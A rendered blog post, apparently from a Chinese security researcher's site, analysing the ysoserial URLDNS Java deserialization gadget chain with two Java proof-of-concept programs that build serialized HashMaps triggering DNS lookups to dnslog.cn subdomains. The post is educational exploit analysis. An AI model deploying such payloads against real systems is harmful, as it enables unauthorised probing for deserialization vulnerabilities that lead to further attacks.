@@ -1,37 +1,423 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ilikeoyt.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="java_URLDNSLOG链URLDNS是ysoserial中的一条利用链，通常用于检测是否存在Java反序列化漏洞，该利用链具有如下特点 123URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java_URLDNSLOG链">
+<meta property="og:url" content="https://ilikeoyt.github.io/2023/07/24/java-URLDNSLOG%E9%93%BE/index.html">
+<meta property="og:site_name" content="ycx&#39;s blog">
+<meta property="og:description" content="java_URLDNSLOG链URLDNS是ysoserial中的一条利用链，通常用于检测是否存在Java反序列化漏洞，该利用链具有如下特点 123URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dnslog1.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dnslog2.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dnslog3.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dnslog4.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dnslog5.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dnslog6.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dnslog7.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dnslog9.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dnslog8.png">
+<meta property="article:published_time" content="2023-07-24T06:36:52.000Z">
+<meta property="article:modified_time" content="2023-07-25T01:59:15.250Z">
+<meta property="article:author" content="ycxlo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/dnslog1.png">
+
+<link rel="canonical" href="https://ilikeoyt.github.io/2023/07/24/java-URLDNSLOG%E9%93%BE/">
 
 
-{% block content %}
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <title>java_URLDNSLOG链 | ycx's blog</title>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ycx's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ilikeoyt.github.io/2023/07/24/java-URLDNSLOG%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ycxlo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ycx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          java_URLDNSLOG链
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-07-24 14:36:52" itemprop="dateCreated datePublished" datetime="2023-07-24T14:36:52+08:00">2023-07-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-07-25 09:59:15" itemprop="dateModified" datetime="2023-07-25T09:59:15+08:00">2023-07-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="java-URLDNSLOG链"><a href="#java-URLDNSLOG链" class="headerlink" title="java_URLDNSLOG链"></a>java_URLDNSLOG链</h1><p><code>URLDNS</code>是<code>ysoserial</code>中的一条利用链，通常用于检测是否存在<code>Java</code>反序列化漏洞，该利用链具有如下特点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用</span><br><span class="line">不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求</span><br><span class="line">目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt;  HashMap.putVal() -&gt; HashMap.hash() </span><br><span class="line">-&gt; URL.hashCode()-&gt;URLStreamHandler.hashCode().getHostAddress</span><br><span class="line">-&gt;URLStreamHandler.hashCode().getHostAddress.InetAddress.getByName<span class="comment">//这个相当于进行了一次dns请求</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="分析调用链"><a href="#分析调用链" class="headerlink" title="分析调用链"></a>分析调用链</h2><p><img src="/image/dnslog1.png" alt="img"></p>
+<p>着重关注for循环，大概是将key和value重新赋值到HashMap上</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>调用了hash()方法，跟进</p>
+<p><img src="/image/dnslog2.png" alt="img"></p>
+<p>调用了key的hashCode()方法，而这个key我们肯定是可控的，根据调用栈，继续调用URL类的hashCode方法</p>
+<p><img src="/image/dnslog3.png" alt="img"></p>
+<p>其中this代表调用这个方法的对象的本身，也就是URL的对象，并且我们可以在URL类的构造方法发现这段代码</p>
+<p><img src="/image/dnslog4.png" alt="img"></p>
+<p>说明这个handler是我们可控的，继续调用URLStreamHandler的hashCode()方法</p>
+<p><img src="/image/dnslog5.png" alt="img"></p>
+<p>继续跟进getHostAddress()方法</p>
+<p><img src="/image/dnslog6.png" alt="img"></p>
+<p>而InetAddress.getByName(host)方法相当于就是进行了一次dns请求</p>
+<h2 id="尝试编写exp"><a href="#尝试编写exp" class="headerlink" title="尝试编写exp"></a>尝试编写exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main.java.urldns;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">dnslog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://q6e394.dnslog.cn/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        hashMap.put(url, <span class="string">&quot;ycxlo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后发现接收到信息</p>
+<p><img src="/image/dnslog7.png" alt="img"></p>
+<h2 id="根据其他师傅的exp进行修改"><a href="#根据其他师傅的exp进行修改" class="headerlink" title="根据其他师傅的exp进行修改"></a>根据其他师傅的exp进行修改</h2><p>看了其他师傅的一些文章，发现还可以对exp进行一些修改，目的是为了只进行一次dns请求</p>
+<p>由于在exp运行过程中，还会调用HashMap的put方法，而put方法同样也有hash(key)，所以会进行两次dns请求</p>
+<p><img src="/image/dnslog9.png" alt="img"></p>
+<p>修改后的exp是这样的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main.java.urldns;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>,<span class="string">&quot;http://o9viut.dnslog.cn/&quot;</span>,handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;ycxlo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/dnslog8.png" alt="img"></p>
+<p>可以发现明显请求次数变少了</p>
+<p>原因大致是这样的：我们定义的SilentURLStreamHandler类继承了URLStreamHandler类，并重写了getHostAddress方法，所以当HashMap的put方法调用getHostAddress方法时，只会返回null，而handler对象又是由transient修饰的，默认不会被序列化，也就是说当该字段被序列化时，这个字段并不会被保存，所以序列化的时候依旧是调用URLStreamHandler类</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/21/java-CommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE/" rel="prev" title="java_CommonsBeanutils1利用链">
+      <i class="fa fa-chevron-left"></i> java_CommonsBeanutils1利用链
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/25/java-Rome%E9%93%BE/" rel="next" title="java_Rome链">
+      java_Rome链 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#java-URLDNSLOG%E9%93%BE"><span class="nav-number">1.</span> <span class="nav-text">java_URLDNSLOG链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">1.1.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-number">1.2.</span> <span class="nav-text">分析调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E7%BC%96%E5%86%99exp"><span class="nav-number">1.3.</span> <span class="nav-text">尝试编写exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E5%85%B6%E4%BB%96%E5%B8%88%E5%82%85%E7%9A%84exp%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9"><span class="nav-number">1.4.</span> <span class="nav-text">根据其他师傅的exp进行修改</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ycxlo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ycxlo</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
